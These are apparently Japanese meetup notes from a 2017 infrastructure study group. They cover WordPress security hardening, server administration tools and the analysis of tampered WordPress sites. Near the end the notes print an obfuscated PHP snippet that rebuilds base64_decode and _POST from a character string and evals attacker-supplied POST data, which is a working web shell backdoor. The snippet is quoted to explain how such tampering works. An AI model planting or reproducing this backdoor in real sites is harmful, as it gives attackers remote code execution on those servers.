---
title: 加古川IT系インフラ勉強会 2017.09
date: 2017/09/09
categories:
  - 開催履歴
tags:
  - 加古川IT系インフラ勉強会
---

加古川IT系インフラ勉強会 2017.09
===

* 開催日：2017/09/09
* 司会：wate
* 参加者数：参加者: 6名 / 学生: 0名 / Hangout: 1名
* 備考：気付いたことなど、自由に記入をお願いします！
* Connpass: https://histudy.connpass.com/event/66082/
* ハッシュタグ：#kakogawa_infra

---

## 脆弱性

* MySQLの不満あれこれ
    * いつの間にかテーブルサイズが肥大化する
    * プラグインによっては、wp_options テーブルが肥大化。。。
    * 「汎用化」に振りすぎ？
* Wordpressのセキュリティ対策
  * REST APIで脆弱性が増えたかも
  * パーミッションに注意
  * セーフモードは既に意味なさげ
  * プラグインを制限する
  * 接続元を国内限定にする(かなり効いた)
  * ファイルのチェックサムを取る
  * gitで管理する
  * WPScanかける
  * ...のような面倒な作業はJenkinsに任せたい(LDAPサーバどうしよう)
* Jenkinsによる自動化とか勉強会やってみたい
    * Jenkins2.0でPipelineが導入された。便利そう
* うちのインフラ部門がAmazon Linux大好きなので、最近そちらやってます
    * Debian慣れしてるので、Amazon Linux 気持ち悪い
    * RedHatに似てるが、バージョンをがんがんあげるので互換性に不安
* CentOS めんどくさい
    * 7に移行中です
    * 7になれてない人大丈夫？
* やはりサーバは2-3年で更新しないと
* クラウドで管理はだいぶ楽になった
    * Shell Scrptでちまちま管理してましたがAnsibleでOK
    * OpenStackまわりとかやってみたいね(ConoHaとか)
* Vineなつかし。MecabはまだUTF-8がデフォルトじゃないのかしら
* 幸いWordPressの闇はまだ見たことないです
* Webの勉強会開催は難しい?
    * 勉強会のフォームを用意して、「あとはよろしくね」というメソッドが有効?
    * WordBench姫路開催の予感
    * WordBench京都、大阪、神戸の所感もげもげ
* サーバ管理ネタをWordBenchあたりで話してみる?
    * 管理者の視点で言えることとか
* サーバアプリケーションの脆弱性対応は、業者ではやりにくい(検閲とかに該当)
* WordPress改竄スクリプトの解析とかやってるところもあります
* 改竄コードの例
    * $dataという変数に、あらかじめbase64でエンコードしておいた生データをデコード、代入している
    * $dataをそのままeval、とかやってそう
    * 怪し気なzipファイルを展開している
    * zipファイル展開確認。フィッシングサイトを開設するとおぼしきphpのコード一式が入っていた
    * おそらく同時に撒いたであろうspamにここのURLが入ってるはず
    * ACLファイルを入れ替えられてるも
* Fail2banをSMTPなどにも入れている
* sshアクセスはWebからのアクセス元のみに限定する
* FollowSymlinkの禁止を導入したが、一部ツールはこれに依存していたりする
* JavaScriptの脆弱性
    * 難読コード(昔の一例) 
        ```php
        <?php
            $sF="PCT4BA6ODSE_";
            $s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);
            $s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[0]);if (isset(${$s20}['nd335c3'])) {
                eval($s21(${$s20}['nd335c3']));
            }
        ?>
        ```
    * 
* 
* 
* 
* 
* 
* 
* 
* 
* 
* 
